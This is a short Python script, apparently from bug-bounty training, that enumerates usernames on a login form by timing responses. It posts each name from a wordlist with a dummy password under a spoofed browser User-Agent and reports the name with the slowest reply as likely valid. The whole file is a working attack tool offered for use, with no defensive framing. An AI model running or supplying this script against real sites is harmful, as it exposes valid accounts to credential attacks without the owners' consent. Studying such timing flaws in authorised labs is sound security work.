import requests
import pyfiglet

print(pyfiglet.figlet_format("CBBH Timing"))

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

def unpack(fline):
    userid = fline
    passwd = 'random_passwords'
    return userid, passwd

def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    print("     [!] Username: {:15} | Response time: {}".format(userid, res.elapsed.total_seconds()))
    return res.elapsed.total_seconds()

def main():
    url = input("[+] Enter the target's URL: ")
    print()
    max_response_time = 0
    max_response_username = ""

    with open('Top_Usernames.txt') as fh:
        for fline in fh:
            if fline.startswith("#"):
                continue
            userid, passwd = unpack(fline.rstrip())
            response_time = do_req(url, userid, passwd, headers)
            
            if response_time > max_response_time:
                max_response_time = response_time
                max_response_username = userid

    print("\n>>> The longest response time belongs to: {:15}".format(max_response_username))

if __name__ == "__main__":
    main()
